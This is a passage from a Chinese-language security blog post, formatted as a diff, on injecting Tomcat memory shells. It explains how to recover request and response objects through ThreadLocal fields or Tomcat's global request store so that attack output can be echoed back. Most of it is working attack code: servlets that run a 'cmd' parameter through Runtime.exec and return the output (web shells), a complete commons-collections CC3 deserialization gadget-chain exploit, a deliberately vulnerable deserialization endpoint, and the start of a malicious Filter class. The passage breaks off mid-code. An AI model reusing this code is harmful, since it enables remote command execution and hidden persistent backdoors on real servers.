+            lastServicedResponsefield.setAccessible(true);
+            //使用modifiersField修改属性值的final修饰
+            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
+            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField(&quot;modifiers&quot;);
+            modifiersfield.setAccessible(true);
+
+            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&amp;~运算得到0x0000
+            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);
+            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() &amp; ~Modifier.FINAL);
+            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() &amp; ~Modifier.FINAL);
+
+
+            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
+            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
+                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
+                lastServicedResponsefield.set(null,new ThreadLocal&lt;ServletResponse&gt;());
+                lastServicedRequestfield.set(null,new ThreadLocal&lt;ServletRequest&gt;());
+
+            }else{//第二次访问开始正式获取当前线程下的Req和Resp
+                ThreadLocal&lt;ServletRequest&gt; threadLocalReq= (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequestfield.get(null);
+                ThreadLocal&lt;ServletResponse&gt; threadLocalResp=(ThreadLocal&lt;ServletResponse&gt;) lastServicedResponsefield.get(null);
+                ServletRequest servletRequest = threadLocalReq.get();
+                ServletResponse servletResponse = threadLocalResp.get();
+
+                String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+                servletResponse.setContentType(&quot;text/html; charset=UTF-8&quot;);
+                PrintWriter writer = servletResponse.getWriter();
+                if (cmd != null) {
+                    try {
+                        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+
+                        //将命令执行结果写入扫描器并读取所有输入
+                        Scanner scanner = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+                        String result = scanner.hasNext()?scanner.next():&quot;&quot;;
+                        scanner.close();
+                        writer.write(result);
+                        writer.flush();
+                        writer.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    } catch (NullPointerException n) {
+                        n.printStackTrace();
+                    }
+                }
+
+                System.out.println(req);
+                System.out.println(servletRequest);
+            }
+
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+}
+</code></pre>
+<h2 id="heading">局限性</h2>
+<p>例如在我们打shiro这种反序列化的时候，通过这种方法是获取不到回显的，在上文我其实已经讲的很清楚了，shiro其实是一个自定义的filter，它会在这里走完所有的逻辑，所以就算我们把下面的条件设置为true了，我们在它赋值前也是拿不到request的</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012956974_00058.png" alt="" /></p>
+<h1 id="font-stylecolorrgb36-41-46-responsefont"><font style="color:rgb(36, 41, 46);">全局存储 Response</font></h1>
+<p>我们经过上文的分析，如果是ThreadLocal类来获取回显的方式，限制还是比较多的，例如shiro这种就不适用，那我们能不能换个思路，去找到Tomcat全局存储的request和response呢？而且这个request必须还是当前进程的，所以我们必须找到一个和当前代码的上下文和Tomcat全局存储的关系</p>
+<p>AbstractProcessor类中我们可以找到了全局存储Response</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012958805_00059.png" alt="" /></p>
+<p>我们先看调用栈（注意这里调试的时候 你的maven依赖中的Tomcat版本和tomcat服务器运行的版本需要一致，不然调试的时候，就会出现字节码与源码不一致导致调试很难受）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013000627_00060.png" alt="" /></p>
+<p>可以看到Http11Processor 是第一个与AbstractProcessor类产生交集的 我们去分析一下这个类（点一下这个调用栈就来到了Http11Processor#service方法中）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947845_00052.png" alt="" /></p>
+<p>我们发现这个request是从AbstractProcessor类中继承过来的，那就从原来的AbstractProcessor类到现在的Http11Processor类 都是有机会获取到request了。观察调用栈其实没有直接对于AbstractProcessor 的引用，那么我们通过去看Http11Processor类 会好很多</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013037418_00080.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013038863_00081.png" alt="" /></p>
+<p>要获取到Http11Processor类 那么我们得先看看它的创建过程</p>
+<p>往上调用一帧，发现是调用的service 也就是Http11Processor#service，这里明显不是创建，继续往上调用一帧</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013035308_00079.png" alt="" /></p>
+<p>可以看到processor被赋值成了Http11Processor对象</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013041267_00082.png" alt="" /></p>
+<p>其中一共有三个if语句。分别是：</p>
+<p>第一个 if 尝试根据协商的协议获取一个合适的处理器。</p>
+<p>第二个 if 在没有找到合适的处理器时，尝试从回收池中获取一个。</p>
+<p>第三个 if 如果回收池中没有处理器，则创建一个新的处理器并注册。</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013042815_00083.png" alt="" /></p>
+<p>在第三个if中调用createProcessor方法来创建它，但是现在还是没办法获取到它，接着往下看</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947883_00053.png" alt="" /></p>
+<p>在register方法中：</p>
+<p>获取processor中的request信息，存储为RequestInfo，然后调用set方法，把信息存储在global中</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013017438_00069.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013019009_00070.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013015844_00068.png" alt="" /></p>
+<p>那么就继续拓展，只要可以获取到ConnectionHandler 的 global 属性就可以获得request</p>
+<p>我们找到ConnectionHandler的创建，发现它在实例化的时候 ，会将整个值调用set方法，赋值给AbstractProtocol中的handler变量，那么如果我们找到了AbstractProtocol的实例，那么就可以直接反射调用get方法来获取到ConnectionHandler，从而获取到global了</p>
+<p>不同版本的源码不太一样，不影响</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013031764_00077.png" alt="" /></p>
+<p>还有一个版本是（意思都是一样的）：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013029783_00076.png" alt="" /></p>
+<p>那我们怎么样才能获取到AbstractProtocol的实例呢？</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013034269_00078.png" alt="" /></p>
+<p>只要获取到下面任意子类就可以获取到AbstractProtocol的实例了</p>
+<p>注意 我们现在好好梳理一下逻辑：</p>
+<p>为什么不直接反射获取，因为在反射的时候，获取到的只是类似于一个指针，并不是直接获得这个类的实例，例如反射获取到了一个类，还需要传入这个类的实例才能准确的改变这个类的值，而此时我们需要改变特定的值 or 获取到特定类的值，直接反射是拿不到这个值的，所以现在写这么多，也都是因为这个原因，我们需要找到一个可以Tomcat创建的实例，而这个实例是可以被我们获取到的，而不是我们自己创建的，这样才是我们想要的request</p>
+<p>我们来看下 Tomcat 请求处理流程</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947805_00050.png" alt="" /></p>
+<p>这个说的很好，就直接复制过来了（稍微加点解释）：</p>
+<p>CoyoteAdapter 作为 Tomcat 中 Connector （ <strong>负责网络处理</strong>）和 Container（ <strong>负责处理请求</strong> ） 的连接桥梁，本身肯定是会内置 Connector 的具体实现对象的，而 Connector 中的内容我们又可以划分为 ProtocolHandler 和 Adapter 两类，这里的 Adapter 就是CoyoteAdapter了。至于 ProtocolHandler，如果是正常的 Http/1.1 的请求，内置的具体实现就是 Http11NioProtocol。<br />
+所以只要我们发送了一次 Http 请求，就能够通过 Connector 获取到 Http11NioProtocol。现在问题是如何获取到 Connctor？还是按照 Tomcat 的架构来，一个大的 server 具体是由每一个小的 service 去实现的，而一个 service 中又由 connector 和 container 组成。就可以考虑通过 service 去获取 connector。<br />
+实际上就是获取 StandardService 的 connectors 内置属性,而 StandardSercvice 在执行 addconnector 方法的时候，最终将所有的 connector 都存进了 connectors 属性中（所以我们还要遍历它）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013004105_00062.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013006110_00063.png" alt="" /></p>
+<p>那么我们要怎么获取到StandardSercvice？<br />
+那就不得不提到Tomcat的类加载机制了：</p>
+<p>Tomcat使用的并不是传统的类加载机制，我们来看下面的例子：</p>
+<p>我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。</p>
+<p>Tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是**<font style="color:#DF2A3F;">WebappClassLoader</font>**。那么我们又如何将原有的父加载器和WebappClassLoader联系起来呢？</p>
+<p><strong><font style="color:#DF2A3F;">这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器。</font></strong>（所以我们可以通过线程来获得ClassLoader，也就是**<font style="color:#DF2A3F;">WebappClassLoader</font>**）</p>
+<p>如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。</p>
+<p>对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。因此WebappClassLoaderBase（这个是WebappClassLoader的父类）就是我们寻找的Thread和Tomcat 运行上下文的联系之一</p>
+<p>具体怎么联系的就看代码</p>
+<p>WebappClassLoaderBase#方法</p>
+<p>获取到WebResourceRoot</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013008084_00064.png" alt="" /></p>
+<p>然后在WebResourceRoot类-&gt;实现类StandardRoot中：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013010266_00065.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013012165_00066.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013013373_00067.png" alt="" /></p>
+<p>这个context其实就是StandardContext：</p>
+<p>这个是没有直接获取属性的方法的 需要通过反射来进行获取<br />
+<img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013002257_00061.png" alt="" /></p>
+<p>ApplicationContext：</p>
+<p>其中的Service中的具体实现类就是 StandardService  而且这里注意的是 这里也没有直接获取到service的方法 就通过反射来获取</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013020338_00071.png" alt="" /></p>
+<p>那么到这里就如愿以偿的获得到了StandardService</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013026232_00074.png" alt="" /></p>
+<h2 id="heading-1">思路梳理</h2>
+<p>我们先是通过线程来获取到WebappClassLoader 然后通过它的父类WebappClassLoaderBase获取到WebResourceRoot接口的standardRoot实现类 -&gt;StandardContext-&gt;ApplicationContext-&gt;StandardService</p>
+<p>然后在StandardService中的connectors 属性存放了Http11NioProtocol的属性 通过Http11NioProtocol类就可以获得父类AbstractProtocol 就可以获取到ConnectionHandler-&gt;global 从而获取到request和response</p>
+<p>下面就来写个poc：</p>
+<p>也就是后面一点点是没有提到的 所以大部分还是很容易写的</p>
+<pre><code class="language-java">package Servlet;
+
+
+import org.apache.catalina.Context;
+import org.apache.catalina.WebResourceRoot;
+import org.apache.catalina.connector.Connector;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardService;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.coyote.ProtocolHandler;
+import org.apache.coyote.RequestGroupInfo;
+import org.apache.coyote.RequestInfo;
+
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.util.List;
+import java.util.Scanner;
+
+@WebServlet(&quot;/evil2&quot;)
+public class Evil2_Servlet  extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse response) throws ServletException, IOException {
+
+        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+       
+        // WebResourceRoot resourceRoot = webappClassLoaderBase.getResources();
+        //通过反射获取是最稳妥的
+        Field webappclassLoaderBaseField=Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;).getDeclaredField(&quot;resources&quot;);
+        webappclassLoaderBaseField.setAccessible(true);
+        WebResourceRoot resourceRoot=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
+
+        Context standardContext = resourceRoot.getContext();
+
+        try {
+            //获取ApplicationContext
+            Field application = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);
+            application.setAccessible(true);
+            ApplicationContext applicationContext = (ApplicationContext) application.get(standardContext);
+
+            //获取StandardService
+            Field Standard = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredField(&quot;service&quot;);
+            Standard.setAccessible(true);
+            StandardService standardService = (StandardService) Standard.get(applicationContext);
+
+            //获取connectors
+            Field connectorfield = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;connectors&quot;);
+            connectorfield.setAccessible(true);
+            Connector[] connectors = (Connector[]) connectorfield.get(standardService);
+            Connector connector = connectors[0];
+
+            //获取到Http11NioProtocol ,通过Http11NioProtocol 获取到父类AbstractProtocol的属性
+            ProtocolHandler protocolHandler = connector.getProtocolHandler();
+            //反射获取ConnectionHandler
+            Field Connection_Handler =Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);
+            Connection_Handler.setAccessible(true);
+            org.apache.tomcat.util.net.AbstractEndpoint.Handler  ConnectionHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) Connection_Handler.get(protocolHandler);
+
+            //获取global
+            Field global_field = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);
+            global_field.setAccessible(true);
+            RequestGroupInfo global = (RequestGroupInfo) global_field.get(ConnectionHandler);
+
+            //获取processors
+            Field processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);
+            processorsField.setAccessible(true);
+            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);
+
+            //获取request
+            Field requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);
+            requestField.setAccessible(true);
+            for(RequestInfo requestInfo : requestInfoList) {
+                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);
+
+                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
+                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
+                org.apache.catalina.connector.Response http_response = http_request.getResponse();
+
+                PrintWriter writer = http_response.getWriter();
+                String cmd = http_request.getParameter(&quot;cmd&quot;);
+
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;);
+                String result = scanner.hasNext()?scanner.next():&quot;&quot;;
+                scanner.close();
+                writer.write(result);
+                writer.flush();
+                writer.close();
+            }
+
+
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+
+
+        
+    }
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013027703_00075.png" alt="" /></p>
+<p>注意点：</p>
+<p><font style="color:rgb(36, 41, 46);">WebappclassLoader 的 </font><strong><font style="color:#DF2A3F;">getResources()</font></strong><font style="color:rgb(36, 41, 46);">方法，早在 8.5.78 的版本就被标价为了</font><code>&lt;font style=&quot;color:rgb(128, 128, 128);&quot;&gt;@Deprecated&lt;/font&gt;</code><font style="color:rgb(36, 41, 46);">，直接就 return null 了，然后在 10.x 版本就直接移除了该方法  所以我们进行反射获取是最稳妥的办法</font></p>
+<p>同时还有个情况，就是在某个项目环境中没有Tomcat依赖，是通过idea去进行非内嵌的形式挂载的Tomcat，这个时候我们项目中没有Tomcat的依赖，就必须全部通过反射的形式去获取：</p>
+<p>核心获取req代码：</p>
+<pre><code class="language-java">// 获取当前线程的 ClassLoader
+Class&lt;?&gt; webappClassLoaderBaseClass = Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;);
+Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
+
+// 获取 WebResourceRoot
+Field resourcesField = webappClassLoaderBaseClass.getDeclaredField(&quot;resources&quot;);
+resourcesField.setAccessible(true);
+Object resourceRoot = resourcesField.get(webappClassLoaderBase);
+
+// 获取 Context
+Class&lt;?&gt; webResourceRootClass = Class.forName(&quot;org.apache.catalina.WebResourceRoot&quot;);
+Object standardContext = webResourceRootClass.getMethod(&quot;getContext&quot;).invoke(resourceRoot);
+
+// 获取 ApplicationContext
+Class&lt;?&gt; standardContextClass = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;);
+Field appField = standardContextClass.getDeclaredField(&quot;context&quot;);
+appField.setAccessible(true);
+Object applicationContext = appField.get(standardContext);
+
+// 获取 StandardService
+Class&lt;?&gt; applicationContextClass = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;);
+Field serviceField = applicationContextClass.getDeclaredField(&quot;service&quot;);
+serviceField.setAccessible(true);
+Object standardService = serviceField.get(applicationContext);
+
+// 获取 Connector[]
+Class&lt;?&gt; standardServiceClass = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;);
+Field connectorsField = standardServiceClass.getDeclaredField(&quot;connectors&quot;);
+connectorsField.setAccessible(true);
+Object[] connectors = (Object[]) connectorsField.get(standardService);
+Object connector = connectors[0];
+
+// 获取 ProtocolHandler
+Class&lt;?&gt; connectorClass = Class.forName(&quot;org.apache.catalina.connector.Connector&quot;);
+Object protocolHandler = connectorClass.getMethod(&quot;getProtocolHandler&quot;).invoke(connector);
+
+// 获取 ConnectionHandler
+Class&lt;?&gt; abstractProtocolClass = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;);
+Field handlerField = abstractProtocolClass.getDeclaredField(&quot;handler&quot;);
+handlerField.setAccessible(true);
+Object connectionHandler = handlerField.get(protocolHandler);
+
+// 获取 global
+Class&lt;?&gt; connectionHandlerClass = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;);
+Field globalField = connectionHandlerClass.getDeclaredField(&quot;global&quot;);
+globalField.setAccessible(true);
+Object global = globalField.get(connectionHandler);
+
+// 获取 processors
+Class&lt;?&gt; requestGroupInfoClass = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;);
+Field processorsField = requestGroupInfoClass.getDeclaredField(&quot;processors&quot;);
+processorsField.setAccessible(true);
+List&lt;?&gt; processors = (List&lt;?&gt;) processorsField.get(global);
+
+// 遍历 RequestInfo
+Class&lt;?&gt; requestInfoClass = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;);
+Field reqField = requestInfoClass.getDeclaredField(&quot;req&quot;);
+reqField.setAccessible(true);
+
+for (Object requestInfo : processors) {
+    Object coyoteRequest = reqField.get(requestInfo);
+    if (coyoteRequest != null) {
+        // 获取 Note[1] -&gt; org.apache.catalina.connector.Request
+        Object httpRequest = coyoteRequest.getClass().getMethod(&quot;getNote&quot;, int.class).invoke(coyoteRequest, 1);
+        if (httpRequest != null &amp;&amp; httpRequest.getClass().getName().contains(&quot;org.apache.catalina.connector.Request&quot;)) {
+            request_cmd = httpRequest;
+            Object httpResponse = httpRequest.getClass().getMethod(&quot;getResponse&quot;).invoke(httpRequest);
+            response_cmd =httpResponse;
+        }
+    }
+}
+</code></pre>
+<h1 id="heading-2">反序列化写入</h1>
+<p>先看看怎么进行远程的反序列化打，由于之前都是直接进行本地打的，我们现在来模拟服务器存在反序列化点：</p>
+<p>依赖：</p>
+<pre><code class="language-java">&lt;dependencies&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+&lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
+&lt;version&gt;4.0.1&lt;/version&gt;
+&lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
+&lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt;
+&lt;version&gt;${junit.version}&lt;/version&gt;
+&lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;commons-collections&lt;/groupId&gt;
+&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+&lt;version&gt;3.2.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;
+&lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;
+&lt;version&gt;${junit.version}&lt;/version&gt;
+&lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<p>服务器代码：</p>
+<pre><code class="language-java">package com.serialization.serialization;
+
+import java.io.*;
+import java.util.Base64;
+import javax.servlet.ServletException;
+import javax.servlet.http.*;
+import javax.servlet.annotation.*;
+
+@WebServlet(&quot;/shell&quot;)
+public class HelloServlet extends HttpServlet {
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        resp.setContentType(&quot;text/html;charset=utf-8&quot;);
+        PrintWriter out = resp.getWriter();
+        out.println(&quot;反序列化点&quot;);
+    }
+
+    @Override
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        byte[] bytes= Base64.getDecoder().decode(req.getParameter(&quot;data&quot;));
+        ByteArrayInputStream BAIS=new ByteArrayInputStream(bytes);
+        ObjectInputStream objectInputStream=new ObjectInputStream(BAIS);
+        try
+            {
+                System.out.println(objectInputStream.readObject());
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+    }
+}
+</code></pre>
+<p>我们这里就用CC3，进行类加载：</p>
+<pre><code class="language-java">package Servlet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3_EXP {
+    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+
+        //满足getTransletInstance的条件
+        Field _name = templatesClass.getDeclaredField(&quot;_name&quot;);
+        _name.setAccessible(true);
+        _name.set(templates, &quot;Bloyet&quot;);
+        Field _class = templatesClass.getDeclaredField(&quot;_class&quot;);
+        _class.setAccessible(true);
+        _class.set(templates, null);
+
+        //满足defineTransletClasses的条件
+        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;H:\\http.class&quot;));
+        byte[][] exp = new byte[][]{_bytecodess};
+        Field _tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfactory.setAccessible(true);
+        _tfactory.set(templates, new TransformerFactoryImpl());
+        Field _bytecodess1 = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        _bytecodess1.setAccessible(true);
+        _bytecodess1.set(templates, exp);
+        //templates.newTransformer();
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        Transformer[] transformer = new Transformer[]{new ConstantTransformer(TrAXFilter.class), instantiateTransformer};
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+        //chainedTransformer.transform(1);
+        Map map = new HashMap();
+        Map decorMap = LazyMap.decorate(map, chainedTransformer);
+        Class cla = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = cla.getDeclaredConstructor(Class.class, Map.class);//第一个参数为Class,第二个为Map类型
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, decorMap);
+        Map newproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
+        Object o =constructor.newInstance(Override.class, newproxy);
+        serialize(o);
+
+        // 指定序列化文件路径
+        String filePath = &quot;D:\\out.obj&quot;;
+
+        // 读取文件为字节数组
+        byte[] fileBytes = readFileToBytes(filePath);
+
+        // 转换为Base64字符串
+        String payload = Base64.getEncoder().encodeToString(fileBytes);
+
+        // 输出或保存
+        System.out.println(payload);
+        byte[] bytes2= Base64.getDecoder().decode(payload);
+
+
+
+       // unserialize(&quot;D:\\out.obj&quot;);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;D:\\out.obj&quot;)));
+        out.writeObject(obj);
+    }
+
+    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream out = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
+        out.readObject();
+    }
+    private static byte[] readFileToBytes(String filePath) throws IOException {
+        File file = new File(filePath);
+        try (FileInputStream fis = new FileInputStream(file);
+             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = fis.read(buffer)) != -1) {
+                bos.write(buffer, 0, len);
+            }
+            return bos.toByteArray();
+        }
+
+}
+}
+</code></pre>
+<p>生成的payload：</p>
+<pre><code class="language-java">
+</code></pre>
+<p>其实区别不大，只不过位置不一样了而已</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013024515_00073.png" alt="" /></p>
+<h2 id="heading-3">反序列化写入内存马</h2>
+<p>我们先来回想一下 之前打的内存马，都是通过JSP来进行的，可以很容易的获取到request，而我们通过反序列化来打的话，就要解决回显问题，就需要参考上文了，因为在前面，也没有进行过反序列化打内存马，所以需要注意一些细节</p>
+<p>JSP的写法：</p>
+<p>可以看到JSP中是有内置的request的，而我们通过反序列化打的话 是没有这个，我们需要通过上文那种方法去获取，</p>
+<p>通过类加载 ，把内存马写进（放在静态代码块中）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013022664_00072.png" alt="" /></p>
+<p>恶意类：</p>
+<pre><code class="language-java">package Filter;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.Context;
+import org.apache.catalina.WebResourceRoot;
+import org.apache.catalina.connector.Connector;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardService;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.coyote.ProtocolHandler;
+import org.apache.coyote.RequestGroupInfo;
+import org.apache.coyote.RequestInfo;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.servlet.*;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.util.List;
+
+public class Filter_shell extends AbstractTranslet implements Filter  {
+
+    static {
+        org.apache.catalina.connector.Request request_cmd = null;
+
+        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        //WebResourceRoot resourceRoot = webappClassLoaderBase.getResources();
+        Field webappclassLoaderBaseField=Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;).getDeclaredField(&quot;resources&quot;);
+        webappclassLoaderBaseField.setAccessible(true);
+        WebResourceRoot resourceRoot=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
+            
